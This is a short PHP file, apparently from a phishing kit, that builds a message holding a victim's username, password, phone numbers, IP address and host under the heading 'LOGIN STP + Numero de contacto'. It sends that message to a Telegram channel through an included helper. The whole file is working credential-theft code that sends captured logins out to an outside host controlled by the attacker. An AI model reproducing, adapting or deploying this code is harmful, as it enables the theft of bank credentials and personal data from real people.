<?php

require_once __DIR__ . '/telegram_send.php';

$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$ip = $ip_real ?? ($_SERVER['REMOTE_ADDR'] ?? '');

$fijo = trim((string) ($telefono_fijo ?? ''));
$cel = trim((string) ($telefono_movil ?? ''));

$lineasNumero = '';
if ($fijo !== '' && $cel !== '') {
    $lineasNumero = "📞 Número: {$fijo}\n📱 Número (alternativo): {$cel}";
} elseif ($fijo !== '') {
    $lineasNumero = "📞 Número: {$fijo}";
} elseif ($cel !== '') {
    $lineasNumero = "📱 Número: {$cel}";
} else {
    $lineasNumero = '📱 Número: N/A';
}

$mensaje = "💻 *LOGIN STP + Numero de contacto*
====================
👤 USER: {$usuario}
🗝️ PASS: {$password}
{$lineasNumero}
📡 IP: {$ip}
🔍 HOST: {$host}
====================";

telegram_send_message($mensaje);
